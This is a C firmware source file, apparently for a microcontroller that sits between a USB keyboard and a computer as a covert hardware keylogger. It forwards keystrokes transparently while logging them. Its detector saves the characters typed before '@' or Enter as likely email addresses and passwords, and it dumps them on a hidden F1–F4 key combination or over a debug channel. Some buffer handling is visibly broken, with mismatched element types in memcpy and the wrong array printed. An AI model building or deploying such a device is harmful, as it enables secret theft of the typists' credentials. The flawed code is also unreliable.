//usbh.c

#include "hal.h"

#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"

#include "usb_hid_keys.h"
#include "usbh_custom_class_example.h"

#include "usbh/debug.h"
#include "usbh/dev/hid.h"
#include <string.h>

/*
 * defines
 */
#define NB_INPUT 200
#define PASSWORD_MAX_SIZE 30  // must be < NB_INPUT

/*
 * variables
 */
static uint8_t inputs[NB_INPUT];
static int     input_timer = -1;
int            input_index = 0;

static int nb_char_pressed = 0;
uint8_t    led_status      = 7;

uint16_t passwords[PASSWORD_BUFFER_SIZE];
int      password_index = 0;

/*
 * prototypes
 */
static void usbh_detector(char input);

/*
 * thread HID
 */
static THD_WORKING_AREA(waTestHID, 1024);
static USBH_DEFINE_BUFFER(uint8_t report[HAL_USBHHID_MAX_INSTANCES][8]);
static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];

/*
 * Input callback
 */
static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
{
    (void)len;
    uint8_t *report = (uint8_t *)hidp->config->report_buffer;

    if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
        /* send the key on the computer */
        usb_report(&UHD2, report, 8);

        //get every input in a tab
        uint16_t input = get_input_hid(report);
        rtt_printf("Key code: %04x, input_index = %d", input, input_index);
        if((uint8_t)input) {
            inputs[input_index] = input;
            usbh_detector(hid2azerty(input));
            if(input_index++ >= 200)
                input_index = 0;
        }

        if(report[2] == KEY_F6)
            for(int i = 0; i < input_index; i++)
                rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);

        if(report[2] == KEY_F5)
            for(int i = 0; i < password_index; i++)
                rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);

        if(report[2] == KEY_F1 &&
           report[3] == KEY_F2 &&
           report[4] == KEY_F3 &&
           report[5] == KEY_F4)
            usb_password_terminal(&UHD2);
    }
}

/*
 * LED manager
 */
static void ThreadTestHID(void *p)
{
    (void)p;
    uint8_t i;

    chRegSetThreadName("HID");

    for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
        hidcfg[i].cb_report     = _hid_report_callback;
        hidcfg[i].protocol      = USBHHID_PROTOCOL_BOOT;
        hidcfg[i].report_buffer = report[i];
        hidcfg[i].report_len    = 8;
    }

    for(;;) {
        for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
            if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_ACTIVE) {
                rtt_printf("HID: Connected, HID%d", i);
                usbhhidStart(&USBHHIDD[i], &hidcfg[i]);
                if(usbhhidGetType(&USBHHIDD[i]) != USBHHID_DEVTYPE_GENERIC) {
                    usbhhidSetIdle(&USBHHIDD[i], 0, 0);
                }
            } else if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_READY) {
                if(usbhhidGetType(&USBHHIDD[i]) == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
                    USBH_DEFINE_BUFFER(uint8_t val);
                    val = led_status;
                    usbhhidSetReport(&USBHHIDD[i], 0, USBHHID_REPORTTYPE_OUTPUT, &val, 1);
                }
            }
        }
        chThdSleepMilliseconds(200);
    }
}

/*
 * Initialisation of OTG FS port connected to a keyboard.
 */
void usbh_init(void)
{
    //  passwords[0] = 'P';
    //  passwords[1] = 'a';
    //  passwords[2] = 's';
    //  passwords[3] = 's';
    //  passwords[4] = 'W';
    //  passwords[5] = 'o';
    //  passwords[6] = 'r';
    //  passwords[7] = 'd';
    //  passwords[8] = ' ';
    //  passwords[9] = '!';

    //  password_index = 10;

    /*USBH_FS OTG*/
    palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DP, PAL_MODE_ALTERNATE(10));

    rtt_printf("Turn on USB power");
    palSetPad(GPIOB, GPIOA_OTG_FS_VBUS);
    chThdSleepMilliseconds(100);

    usbhStart(&USBHD1);
    chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
}

/* 
 * Store <size> lasts inputs into password buffer
 * size: number of inputs to store
 */
static void store_lasts_inputs(int size)
{
    if(input_index < size) {  // buffer made a loop
        int bytes_written = size - input_index;
        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, bytes_written);
        memcpy(passwords + password_index + bytes_written, inputs, size - bytes_written);
    } else
        memcpy(passwords + password_index, inputs + input_index - size, size);
    password_index += size;
}

void usbh_detector(char input)
{
    if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
        rtt_printf("[WARNING] Password buffer full\n");
        return;
    }
    nb_char_pressed++;
    // check if current input is interesting
    switch(input) {
        case '@':  // email is expected
            rtt_printf("@ detected\n");
            if(nb_char_pressed > PASSWORD_MAX_SIZE)
                nb_char_pressed = PASSWORD_MAX_SIZE;
            input_timer         = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            break;
        case '\n':  // password is expected
            rtt_printf("[enter] detected\n");
            if(nb_char_pressed > PASSWORD_MAX_SIZE)
                nb_char_pressed = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            // disable input timer
            input_timer = -1;
            // print password buffer
            rtt_printf("PASSWORD :");
            SEGGER_RTT_Write(0, passwords, password_index);
            rtt_printf("");
            break;
    }
    // if input timer is not disabled, decrease its value
    if(input_timer != -1)
        input_timer--;
    // if input timer value is 0, store lasts inputs
    if(input_timer == 0) {
        store_lasts_inputs(PASSWORD_MAX_SIZE);
        rtt_printf("PASSWORD :");
        SEGGER_RTT_Write(0, passwords, password_index);
        rtt_printf("");
    }
}
